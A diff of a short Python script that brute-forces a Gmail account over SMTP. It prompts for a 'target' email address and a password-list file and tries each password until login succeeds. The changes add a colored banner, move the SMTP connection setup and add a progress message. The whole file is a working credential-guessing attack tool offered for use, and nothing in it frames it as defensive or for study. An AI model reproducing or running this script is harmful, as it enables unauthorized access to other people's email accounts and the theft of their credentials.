@@ -1,8 +1,13 @@
 import smtplib
+import sys
 
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
 
+sys.ps1 = '\033[01;32m '
+print(sys.ps1)
 print('''
-
  ####### ######   #####   #####  
     #    #     # #     # #     # 
     #    #     #       #       # 
@@ -11,12 +16,7 @@ print('''
     #    #    #  #     # #     # 
     #    #     #  #####   #####  
                                  
-
 ''')
-
-smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
-smtpserver.ehlo()
-smtpserver.starttls()
 
 print("connection successful")
 
@@ -26,7 +26,7 @@ user = input("Enter the targets email address: ")
 
 pwfile = input("what is your password file directory: ")
 pwfile = open(pwfile, "r")
-
+print("Checking all passowrds in the list please hold on it will take some time depends on password list and password")
 
 for password in pwfile:
     try:
@@ -36,4 +36,3 @@ for password in pwfile:
         
     except smtplib.SMTPAuthenticationError:
         print(password, "is not the password")
-
